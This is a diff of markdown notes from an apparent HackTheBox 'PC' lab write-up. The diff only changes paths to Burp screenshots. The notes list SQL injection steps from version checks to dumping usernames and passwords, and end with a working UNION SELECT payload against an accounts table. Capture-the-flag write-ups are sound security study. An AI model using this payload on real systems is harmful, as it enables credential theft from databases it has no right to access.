@@ -2,26 +2,26 @@
 there was a bit of fiddling with the token
 
 confirm sqli (or at least math :D)
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp1.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp1.png]]
 
 Get version
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp2.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp2.png]]
 
 Get tables
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp3.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp3.png]]
 
 Get columns
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp4.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp4.png]]
 
 
 Get usernames
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp5.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp5.png]]
 
 Get passwords
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp6.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp6.png]]
 
 Prettier output
-![[Public/InfoSec/Boxes/HackTheBox/PC (Done)/burp7.png]]
+![[InfoSec/Boxes/HackTheBox/PC (Done)/burp7.png]]
 ```sql
 2 UNION SELECT 'usernames: ' || group_concat(username,', ') || ' - ' || 'passwords: ' || group_concat(password,', ') FROM accounts -- -
 ```
